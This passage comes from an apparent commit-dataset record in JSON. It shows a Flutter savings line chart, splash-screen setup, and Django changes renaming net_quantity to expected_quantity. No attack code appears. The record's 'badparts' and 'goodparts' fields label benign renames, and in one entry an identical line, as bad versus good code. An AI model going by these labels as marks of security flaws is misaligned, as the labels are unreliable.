 String month = monthList[value.toInt()-1];\n+      return SideTitleWidget(\n+        axisSide: meta.axisSide,\n+        space: 5,\n+        child: Text(month, style: style),\n+      );\n+    },\n+  );\n+\n+  SideTitles get leftTitles => SideTitles(\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Color(0xff75729e),\n+        fontWeight: FontWeight.bold,\n+        fontSize: 14,\n+      );\n+      return Text(\"$value\", style: style, textAlign: TextAlign.center);\n+    },\n+    showTitles: true,\n+    interval: (\n+      ([getMinMaxQuantity().max.ceilToDouble(), \n+      getMinMaxQuantity().min.floorToDouble().abs()].reduce(max))\n+      \/ 5)\n+      .abs().ceilToDouble(),\n+    reservedSize: 40,\n+  );\n+\n+  \/\/\/ Border chart side tittles setup\n+  FlTitlesData get titlesData => FlTitlesData(\n+    bottomTitles: AxisTitles(\n+      sideTitles: bottomTitles,\n+    ),\n+    \/\/ Ignore right details\n+    rightTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    \/\/ Ignore top details\n+    topTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    leftTitles: AxisTitles(\n+      sideTitles: leftTitles,\n+    ),\n+  );\n+\n+  List<LineChartBarData> get lineBarsData => [\n+    quantityChartBarData(),\n+    expectedChartBarData(),\n+  ];\n+  \n+  final List<String> monthList;\n+  final List<MonthlyBalanceModel> monthlyBalances;\n+  MinMaxModel? minMaxModel;\n+\n+  SavingsYearLineChart({\n+    required this.monthList,\n+    required this.monthlyBalances,\n+    this.minMaxModel,\n+    super.key});\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return Padding(\n+      padding: const EdgeInsets.all(15),\n+      child: LineChart(\n+        LineChartData(\n+          gridData: FlGridData(show: true),\n+          titlesData: titlesData,\n+          borderData: borderData,\n+          lineBarsData: lineBarsData,\n+          minX: 1,\n+          maxX: 12,\n+          maxY: getMinMaxQuantity().max.ceilToDouble(),\n+          minY: getMinMaxQuantity().min.floorToDouble(),\n+        ),\n+        swapAnimationDuration: const Duration(milliseconds: 250),\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData quantityChartBarData() {\n+    \/\/ Dictionary with months and gross quantities per month\n+    Map<int, double> spotsMap = {};\n+    for (MonthlyBalanceModel monthlyBalance in monthlyBalances) {\n+      if (spotsMap.containsKey(monthlyBalance.month)) {\n+        spotsMap[monthlyBalance.month] = spotsMap[monthlyBalance.month]! + monthlyBalance.grossQuantity;\n+      } else {\n+        spotsMap[monthlyBalance.month] = monthlyBalance.grossQuantity;\n+      }\n+    }\n+    \/\/ Check unexistant months\n+    for (int month = 1; month <= 12; month++) {\n+      if (!spotsMap.containsKey(month)) {\n+        spotsMap[month] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int month in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(month.toDouble(), spotsMap[month]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(184, 7, 95, 15),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(34, 9, 82, 15),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData expectedChartBarData() { \n+    \/\/ Dictionary with months and expected quantities per month\n+    Map<int, double> spotsMap = {};\n+    for (MonthlyBalanceModel monthlyBalance in monthlyBalances) {\n+      if (spotsMap.containsKey(monthlyBalance.month)) {\n+        spotsMap[monthlyBalance.month] = spotsMap[monthlyBalance.month]! + monthlyBalance.expectedQuantity;\n+      } else {\n+        spotsMap[monthlyBalance.month] = monthlyBalance.expectedQuantity;\n+      }\n+    }\n+    \/\/ Check unexistant months\n+    for (int month = 1; month <= 12; month++) {\n+      if (!spotsMap.containsKey(month)) {\n+        spotsMap[month] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int month in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(month.toDouble(), spotsMap[month]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(225, 224, 167, 231),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(47, 224, 167, 231),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  MinMaxModel getMinMaxQuantity() {\n+    if (minMaxModel != null) return minMaxModel!;\n+    double maxQuantity = 4.0;\n+    double minQuantity = 0.0;\n+    Map<String, double> quantityMap = {};\n+    Map<String, double> expectedMap = {};\n+    for (MonthlyBalanceModel monthlyBalance in monthlyBalances) {\n+      String key = \"${monthlyBalance.month}\";\n+      if (quantityMap.containsKey(key)) {\n+        quantityMap[key] = quantityMap[key]! + monthlyBalance.grossQuantity;\n+      } else {\n+        quantityMap[key] = monthlyBalance.grossQuantity;\n+      }\n+      if (expectedMap.containsKey(key)) {\n+        expectedMap[key] = expectedMap[key]! + monthlyBalance.expectedQuantity;\n+      } else {\n+        expectedMap[key] = monthlyBalance.expectedQuantity;\n+      }\n+    }\n+    if (monthlyBalances.isNotEmpty) {\n+      maxQuantity = quantityMap.values.reduce(max);\n+      double maxExpected = expectedMap.values.reduce(max);\n+      if (maxQuantity < maxExpected) maxQuantity = maxExpected;\n+      minQuantity = quantityMap.values.reduce(min);\n+      double minExpected = expectedMap.values.reduce(min);\n+      if (minQuantity > minExpected) minQuantity = minExpected;\n+    }\n+    if (maxQuantity < 4) maxQuantity = 4;\n+    if (minQuantity > 0) minQuantity = 0;\n+    minMaxModel = MinMaxModel(min: minQuantity, max: maxQuantity);\n+    return minMaxModel!;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/navigation\/router.dart b\/frontend\/flutter\/lib\/src\/navigation\/router.dart\nindex 951ea29..365afbf 100644\n--- a\/frontend\/flutter\/lib\/src\/navigation\/router.dart\n+++ b\/frontend\/flutter\/lib\/src\/navigation\/router.dart\n@@ -7,6 +7,7 @@ import 'package:balance_home_app\/src\/features\/home\/presentation\/views\/home_view.\n import 'package:balance_home_app\/src\/features\/login\/logic\/providers\/login_provider.dart';\n import 'package:balance_home_app\/src\/features\/auth\/logic\/providers\/auth_state.dart';\n import 'package:balance_home_app\/src\/features\/login\/presentation\/views\/forgot_password_view.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/views\/statistics_view.dart';\n import 'package:flutter\/material.dart';\n import 'package:flutter_riverpod\/flutter_riverpod.dart';\n import 'package:go_router\/go_router.dart';\n@@ -33,7 +34,7 @@ class RouterNotifier extends ChangeNotifier {\n           key: _scaffoldKey,\n           child: HomeView(\n             selectedSection: HomeTab.statistics,\n-            child: const Center(child: Text(\"Hello World\"))\n+            child: Center(child: StatisticsView())\n           )\n         ),\n     ),\ndiff --git a\/frontend\/flutter\/pubspec.yaml b\/frontend\/flutter\/pubspec.yaml\nindex dd73740..abaea67 100644\n--- a\/frontend\/flutter\/pubspec.yaml\n+++ b\/frontend\/flutter\/pubspec.yaml\n@@ -5,7 +5,7 @@ description: Revenues and expenses management.\n # pub.dev using `flutter pub publish`. This is preferred for private packages.\n publish_to: 'none' # Remove this line if you wish to publish to pub.dev\n \n-version: 0.0.2+2\n+version: 0.0.3+3\n \n environment:\n   sdk: '>=2.18.2 <3.0.0'\n@@ -56,6 +56,10 @@ dependencies:\n   universal_io: ^2.0.4\n   # Flags images\n   flag: ^6.0.0\n+  # Graphics\n+  fl_chart: ^0.55.2\n+  # Env code generation\n+  envied: ^0.2.4\n   \n \n dev_dependencies:\n@@ -70,6 +74,10 @@ dev_dependencies:\n   build_runner: ^2.1.10\n   freezed: ^2.0.3\n   json_serializable: ^6.5.3\n+  # Env code generator\n+  envied_generator: ^0.2.3+1\n+  # Splash screen\n+  flutter_native_splash: ^2.2.15\n \n # The following section is specific to Flutter packages.\n flutter:\n@@ -81,7 +89,8 @@ flutter:\n   assets:\n     - .env\n     - assets\/images\/\n-  \n+\n+# Icons setup: \n flutter_icons:\n   android: true\n   image_path_android: 'assets\/images\/balance_home_app_icon.png'\n@@ -94,4 +103,34 @@ flutter_icons:\n   windows:\n     generate: true\n     image_path: \"assets\/images\/balance_home_app_icon.png\"\n-    icon_size: 48 # min:48, max:256, default: 48\n\\ No newline at end of file\n+    icon_size: 48 # min:48, max:256, default: 48\n+\n+\n+# Splash screen setup:\n+# Full docs: https:\/\/pub.dev\/packages\/flutter_native_splash\n+flutter_native_splash:\n+  \n+  # Splash screen background color.\n+  color: \"#fdffcd\"\n+\n+  # Background image:\n+  # background_image: \"assets\/balance_home_app_splash.png\"\n+  \n+  # Image used in the splash screen. It must be a png file and \n+  # should be sized for 4x pixel density\n+  image: assets\/images\/balance_home_app_splash.png\n+  \n+  # Image used as branding in the splash screen, must be a png file\n+  # branding: assets\/dart.png\n+\n+  android_12:\n+    image: assets\/images\/balance_home_app_splash.png\n+    # Splash screen background color\n+    color: \"#fdffcd\"\n+    # App icon background color.\n+    icon_background_color: \"#8F8F5C\"\n+  \n+  # Used to disable generating a splash screen on a given platform\n+  #android: false\n+  #ios: false\n+  #web: false\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/web\/index.html b\/frontend\/flutter\/web\/index.html\nindex 0f4d8a7..0bd16c8 100644\n--- a\/frontend\/flutter\/web\/index.html\n+++ b\/frontend\/flutter\/web\/index.html\n@@ -1,6 +1,4 @@\n-<!DOCTYPE html>\n-<html>\n-<head>\n+<!DOCTYPE html><html><head>\n   <!--\n     If you are serving your web app in a path other than the root, change the\n     href value below to reflect the base path you are serving from.\n@@ -27,7 +25,7 @@\n   <link rel=\"apple-touch-icon\" href=\"icons\/Icon-192.png\">\n \n   <!-- Favicon -->\n-  <link rel=\"icon\" type=\"image\/png\" href=\"favicon.png\"\/>\n+  <link rel=\"icon\" type=\"image\/png\" href=\"favicon.png\">\n \n   <title>balance_home_app<\/title>\n   <link rel=\"manifest\" href=\"manifest.json\">\n@@ -37,9 +35,16 @@\n     var serviceWorkerVersion = null;\n   <\/script>\n   <!-- This script adds the flutter initialization JS code -->\n-  <script src=\"flutter.js\" defer><\/script>\n+  <script src=\"flutter.js\" defer=\"\"><\/script>\n+  <link rel=\"stylesheet\" type=\"text\/css\" href=\"splash\/style.css\">\n+  <meta content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" name=\"viewport\">\n+  <script src=\"splash\/splash.js\"><\/script>\n <\/head>\n-<body>\n+<body>  <picture id=\"splash\">\n+      <source srcset=\"splash\/img\/light-1x.png 1x, splash\/img\/light-2x.png 2x, splash\/img\/light-3x.png 3x, splash\/img\/light-4x.png 4x\" media=\"(prefers-color-scheme: light)\">\n+      <source srcset=\"splash\/img\/dark-1x.png 1x, splash\/img\/dark-2x.png 2x, splash\/img\/dark-3x.png 3x, splash\/img\/dark-4x.png 4x\" media=\"(prefers-color-scheme: dark)\">\n+      <img class=\"center\" aria-hidden=\"true\" src=\"splash\/img\/light-1x.png\" alt=\"\">\n+  <\/picture>              \n   <script>\n     window.addEventListener('load', function(ev) {\n       \/\/ Download main.dart.js\n@@ -54,5 +59,6 @@\n       });\n     });\n   <\/script>\n-<\/body>\n-<\/html>\n+\n+\n+<\/body><\/html>\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/dark-1x.png b\/frontend\/flutter\/web\/splash\/img\/dark-1x.png\nnew file mode 100644\nindex 0000000..8534598\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/dark-1x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/dark-2x.png b\/frontend\/flutter\/web\/splash\/img\/dark-2x.png\nnew file mode 100644\nindex 0000000..2311b33\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/dark-2x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/dark-3x.png b\/frontend\/flutter\/web\/splash\/img\/dark-3x.png\nnew file mode 100644\nindex 0000000..22be0fe\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/dark-3x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/dark-4x.png b\/frontend\/flutter\/web\/splash\/img\/dark-4x.png\nnew file mode 100644\nindex 0000000..fc566c5\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/dark-4x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/light-1x.png b\/frontend\/flutter\/web\/splash\/img\/light-1x.png\nnew file mode 100644\nindex 0000000..8534598\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/light-1x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/light-2x.png b\/frontend\/flutter\/web\/splash\/img\/light-2x.png\nnew file mode 100644\nindex 0000000..2311b33\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/light-2x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/light-3x.png b\/frontend\/flutter\/web\/splash\/img\/light-3x.png\nnew file mode 100644\nindex 0000000..22be0fe\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/light-3x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/img\/light-4x.png b\/frontend\/flutter\/web\/splash\/img\/light-4x.png\nnew file mode 100644\nindex 0000000..fc566c5\nBinary files \/dev\/null and b\/frontend\/flutter\/web\/splash\/img\/light-4x.png differ\ndiff --git a\/frontend\/flutter\/web\/splash\/splash.js b\/frontend\/flutter\/web\/splash\/splash.js\nnew file mode 100644\nindex 0000000..3b6ed11\n--- \/dev\/null\n+++ b\/frontend\/flutter\/web\/splash\/splash.js\n@@ -0,0 +1,5 @@\n+function removeSplashFromWeb() {\n+  document.getElementById(\"splash\")?.remove();\n+  document.getElementById(\"splash-branding\")?.remove();\n+  document.body.style.background = \"transparent\";\n+}\ndiff --git a\/frontend\/flutter\/web\/splash\/style.css b\/frontend\/flutter\/web\/splash\/style.css\nnew file mode 100644\nindex 0000000..d1441f3\n--- \/dev\/null\n+++ b\/frontend\/flutter\/web\/splash\/style.css\n@@ -0,0 +1,52 @@\n+body {\n+  margin:0;\n+  height:100%;\n+  background-color: #fdffcd;\n+  background-size: 100% 100%;\n+}\n+\n+.center {\n+  margin: 0;\n+  position: absolute;\n+  top: 50%;\n+  left: 50%;\n+  -ms-transform: translate(-50%, -50%);\n+  transform: translate(-50%, -50%);\n+}\n+\n+.contain {\n+  display:block;\n+  width:100%; height:100%;\n+  object-fit: contain;\n+}\n+\n+.stretch {\n+  display:block;\n+  width:100%; height:100%;\n+}\n+\n+.cover {\n+  display:block;\n+  width:100%; height:100%;\n+  object-fit: cover;\n+}\n+\n+.bottom {\n+  position: absolute;\n+  bottom: 0;\n+  left: 50%;\n+  -ms-transform: translate(-50%, 0);\n+  transform: translate(-50%, 0);\n+}\n+\n+.bottomLeft {\n+  position: absolute;\n+  bottom: 0;\n+  left: 0;\n+}\n+\n+.bottomRight {\n+  position: absolute;\n+  bottom: 0;\n+  right: 0;\n+}\n","message":"","files":{"\/backend\/djangorest\/balance\/admin.py":{"changes":[{"diff":"\n     fields = (\n         'id',\n         'year',\n-        ('gross_quantity', 'net_quantity',),\n+        ('gross_quantity', 'expected_quantity',),\n         'coin_type',\n         'owner',\n         'created',\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/admin.py","badparts":["        ('gross_quantity', 'net_quantity',),"],"goodparts":["        ('gross_quantity', 'expected_quantity',),"]},{"diff":"\n     fields = (\n         'id',\n         ('month', 'year',),\n-        ('gross_quantity', 'net_quantity',),\n+        ('gross_quantity', 'expected_quantity',),\n         'coin_type',\n         'owner',\n         'created',","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/admin.py","badparts":["        ('gross_quantity', 'net_quantity',),"],"goodparts":["        ('gross_quantity', 'expected_quantity',),"]}],"source":"\nfrom django.contrib import admin from balance.models import AnnualBalance, MonthlyBalance @admin.register(AnnualBalance) class AnnualBalanceAdmin(admin.ModelAdmin): fields=( 'id', 'year', ('gross_quantity', 'net_quantity',), 'coin_type', 'owner', 'created', 'updated' ) readonly_fields=( 'id', 'created', 'updated' ) @admin.register(MonthlyBalance) class MonthlyBalanceAdmin(admin.ModelAdmin): fields=( 'id', ('month', 'year',), ('gross_quantity', 'net_quantity',), 'coin_type', 'owner', 'created', 'updated' ) readonly_fields=( 'id', 'created', 'updated' ) ","sourceWithComments":"from django.contrib import admin\nfrom balance.models import AnnualBalance, MonthlyBalance\n\n\n\n@admin.register(AnnualBalance)\nclass AnnualBalanceAdmin(admin.ModelAdmin):\n    fields = (\n        'id',\n        'year',\n        ('gross_quantity', 'net_quantity',),\n        'coin_type',\n        'owner',\n        'created',\n        'updated'\n    )\n    readonly_fields = (\n        'id',\n        'created',\n        'updated'\n    )\n\n\n@admin.register(MonthlyBalance)\nclass MonthlyBalanceAdmin(admin.ModelAdmin):\n    fields = (\n        'id',\n        ('month', 'year',),\n        ('gross_quantity', 'net_quantity',),\n        'coin_type',\n        'owner',\n        'created',\n        'updated'\n    )\n    readonly_fields = (\n        'id',\n        'created',\n        'updated'\n    )"},"\/backend\/djangorest\/balance\/api\/filter.py":{"changes":[{"diff":"\n         lookup_expr = \"lte\",\n         label = \"Max gross quantity\"\n     )\n-    net_quantity_min = filters.NumberFilter(\n-        field_name = \"net_quantity\",\n+    expected_quantity_min = filters.NumberFilter(\n+        field_name = \"expected_quantity\",\n         lookup_expr = \"gte\",\n-        label = \"Min net quantity\"\n+        label = \"Min expected quantity\"\n     )\n-    net_quantity_max = filters.NumberFilter(\n-        field_name = \"net_quantity\",\n+    expected_quantity_max = filters.NumberFilter(\n+        field_name = \"expected_quantity\",\n         lookup_expr = \"lte\",\n-        label = \"Max net quantity\"\n+        label = \"Max expected quantity\"\n     )\n     \n     class Meta","add":6,"remove":6,"filename":"\/backend\/djangorest\/balance\/api\/filter.py","badparts":["    net_quantity_min = filters.NumberFilter(","        field_name = \"net_quantity\",","        label = \"Min net quantity\"","    net_quantity_max = filters.NumberFilter(","        field_name = \"net_quantity\",","        label = \"Max net quantity\""],"goodparts":["    expected_quantity_min = filters.NumberFilter(","        field_name = \"expected_quantity\",","        label = \"Min expected quantity\"","    expected_quantity_max = filters.NumberFilter(","        field_name = \"expected_quantity\",","        label = \"Max expected quantity\""]}],"source":"\nfrom django_filters import rest_framework as filters from balance.models import AnnualBalance, MonthlyBalance class AnnualBalanceFilterSet(filters.FilterSet): gross_quantity_min=filters.NumberFilter( field_name=\"gross_quantity\", lookup_expr=\"gte\", label=\"Min gross quantity\" ) gross_quantity_max=filters.NumberFilter( field_name=\"gross_quantity\", lookup_expr=\"lte\", label=\"Max gross quantity\" ) net_quantity_min=filters.NumberFilter( field_name=\"net_quantity\", lookup_expr=\"gte\", label=\"Min net quantity\" ) net_quantity_max=filters.NumberFilter( field_name=\"net_quantity\", lookup_expr=\"lte\", label=\"Max net quantity\" ) class Meta: model=AnnualBalance fields=[\"coin_type\", \"year\"] class MonthlyBalanceFilterSet(AnnualBalanceFilterSet): class Meta: model=MonthlyBalance fields=[\"coin_type\", \"year\", \"month\"] ","sourceWithComments":"from django_filters import rest_framework as filters\nfrom balance.models import AnnualBalance, MonthlyBalance\n\n\nclass AnnualBalanceFilterSet(filters.FilterSet):\n    gross_quantity_min = filters.NumberFilter(\n        field_name = \"gross_quantity\",\n        lookup_expr = \"gte\",\n        label = \"Min gross quantity\"\n    )\n    gross_quantity_max = filters.NumberFilter(\n        field_name = \"gross_quantity\",\n        lookup_expr = \"lte\",\n        label = \"Max gross quantity\"\n    )\n    net_quantity_min = filters.NumberFilter(\n        field_name = \"net_quantity\",\n        lookup_expr = \"gte\",\n        label = \"Min net quantity\"\n    )\n    net_quantity_max = filters.NumberFilter(\n        field_name = \"net_quantity\",\n        lookup_expr = \"lte\",\n        label = \"Max net quantity\"\n    )\n    \n    class Meta:\n        model = AnnualBalance\n        fields = [\"coin_type\", \"year\"]\n\n\nclass MonthlyBalanceFilterSet(AnnualBalanceFilterSet):\n    class Meta:\n        model = MonthlyBalance\n        fields = [\"coin_type\", \"year\", \"month\"]\n"},"\/backend\/djangorest\/balance\/api\/serializers.py":{"changes":[{"diff":"\n         model = AnnualBalance\n         fields = [\n             'gross_quantity',\n-            'net_quantity',\n+            'expected_quantity',\n             'coin_type',\n             'year',\n             'created'\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/api\/serializers.py","badparts":["            'net_quantity',"],"goodparts":["            'expected_quantity',"]},{"diff":"\n         model = MonthlyBalance\n         fields = [\n             'gross_quantity',\n-            'net_quantity',\n+            'expected_quantity',\n             'coin_type',\n             'year',\n             'month","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/api\/serializers.py","badparts":["            'net_quantity',"],"goodparts":["            'expected_quantity',"]}],"source":"\nfrom rest_framework import serializers from balance.models import AnnualBalance, MonthlyBalance class AnnualBalanceSerializer(serializers.ModelSerializer): class Meta: model=AnnualBalance fields=[ 'gross_quantity', 'net_quantity', 'coin_type', 'year', 'created' ] class MonthlyBalanceSerializer(serializers.ModelSerializer): class Meta: model=MonthlyBalance fields=[ 'gross_quantity', 'net_quantity', 'coin_type', 'year', 'month', 'created' ] ","sourceWithComments":"from rest_framework import serializers\nfrom balance.models import AnnualBalance, MonthlyBalance\n\n\nclass AnnualBalanceSerializer(serializers.ModelSerializer):\n    # Foreign Key fields like coin_type will only show its primary key\n    class Meta:\n        model = AnnualBalance\n        fields = [\n            'gross_quantity',\n            'net_quantity',\n            'coin_type',\n            'year',\n            'created'\n        ]\n\nclass MonthlyBalanceSerializer(serializers.ModelSerializer):\n    # Foreign Key fields like coin_type will only show its primary key\n    class Meta:\n        model = MonthlyBalance\n        fields = [\n            'gross_quantity',\n            'net_quantity',\n            'coin_type',\n            'year',\n            'month',\n            'created'\n        ]"},"\/backend\/djangorest\/balance\/migrations\/0001_initial.py":{"changes":[{"diff":"\n             fields=[\n                 ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                 ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')),\n-                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),\n+                ('expected_quantity', models.FloatField(default=0, verbose_name='expected quantity')),\n                 ('created', models.DateTimeField(auto_now_add=True)),\n                 ('updated', models.DateTimeField(auto_now_add=True)),\n                 ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')),\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/migrations\/0001_initial.py","badparts":["                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),"],"goodparts":["                ('expected_quantity', models.FloatField(default=0, verbose_name='expected quantity')),"]},{"diff":"\n             fields=[\n                 ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                 ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')),\n-                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),\n+                ('expected_quantity', models.FloatField(default=0, verbose_name='expected quantity')),\n                 ('created', models.DateTimeField(auto_now_add=True)),\n                 ('updated', models.DateTimeField(auto_now_add=True)),\n                 ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year'","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/migrations\/0001_initial.py","badparts":["                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),"],"goodparts":["                ('expected_quantity', models.FloatField(default=0, verbose_name='expected quantity')),"]}],"source":"\n import django.core.validators from django.db import migrations, models import django.db.models.deletion import uuid class Migration(migrations.Migration): initial=True dependencies=[ ('coin', '0001_initial'), ] operations=[ migrations.CreateModel( name='AnnualBalance', fields=[ ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)), ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')), ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')), ('created', models.DateTimeField(auto_now_add=True)), ('updated', models.DateTimeField(auto_now_add=True)), ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')), ], options={ 'verbose_name': 'Annual balance', 'verbose_name_plural': 'Annual balances', 'ordering':['-created'], 'abstract': False, }, ), migrations.CreateModel( name='MonthlyBalance', fields=[ ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)), ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')), ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')), ('created', models.DateTimeField(auto_now_add=True)), ('updated', models.DateTimeField(auto_now_add=True)), ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')), ('month', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(12)], verbose_name='month')), ('coin_type', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='coin type')), ], options={ 'verbose_name': 'Monthly balance', 'verbose_name_plural': 'Monthly balances', 'ordering':['-created'], 'abstract': False, }, ), ] ","sourceWithComments":"# Generated by Django 4.0.7 on 2022-10-22 21:39\n\nimport django.core.validators\nfrom django.db import migrations, models\nimport django.db.models.deletion\nimport uuid\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        ('coin', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='AnnualBalance',\n            fields=[\n                ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')),\n                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),\n                ('created', models.DateTimeField(auto_now_add=True)),\n                ('updated', models.DateTimeField(auto_now_add=True)),\n                ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')),\n            ],\n            options={\n                'verbose_name': 'Annual balance',\n                'verbose_name_plural': 'Annual balances',\n                'ordering': ['-created'],\n                'abstract': False,\n            },\n        ),\n        migrations.CreateModel(\n            name='MonthlyBalance',\n            fields=[\n                ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')),\n                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),\n                ('created', models.DateTimeField(auto_now_add=True)),\n                ('updated', models.DateTimeField(auto_now_add=True)),\n                ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')),\n                ('month', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(12)], verbose_name='month')),\n                ('coin_type', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='coin type')),\n            ],\n            options={\n                'verbose_name': 'Monthly balance',\n                'verbose_name_plural': 'Monthly balances',\n                'ordering': ['-created'],\n                'abstract': False,\n            },\n        ),\n    ]\n"},"\/backend\/djangorest\/balance\/migrations\/0002_initial.py":{"changes":[{"diff":"\n     initial = True\n \n     dependencies = [\n-        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n         ('coin', '0001_initial'),\n         ('balance', '0001_initial'),\n+        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n     ]\n \n     operations","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/migrations\/0002_initial.py","badparts":["        migrations.swappable_dependency(settings.AUTH_USER_MODEL),"],"goodparts":["        migrations.swappable_dependency(settings.AUTH_USER_MODEL),"]}],"source":"\n from django.conf import settings from django.db import migrations, models import django.db.models.deletion class Migration(migrations.Migration): initial=True dependencies=[ migrations.swappable_dependency(settings.AUTH_USER_MODEL), ('coin', '0001_initial'), ('balance', '0001_initial'), ] operations=[ migrations.AddField( model_name='monthlybalance', name='owner', field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='owner'), ), migrations.AddField( model_name='annualbalance', name='coin_type', field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='coin type'), ), migrations.AddField( model_name='annualbalance', name='owner', field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='owner'), ), ] ","sourceWithComments":"# Generated by Django 4.0.7 on 2022-10-22 21:39\n\nfrom django.conf import settings\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n        ('coin', '0001_initial'),\n        ('balance', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='monthlybalance',\n            name='owner',\n            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='owner'),\n        ),\n        migrations.AddField(\n            model_name='annualbalance',\n            name='coin_type',\n            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='coin type'),\n        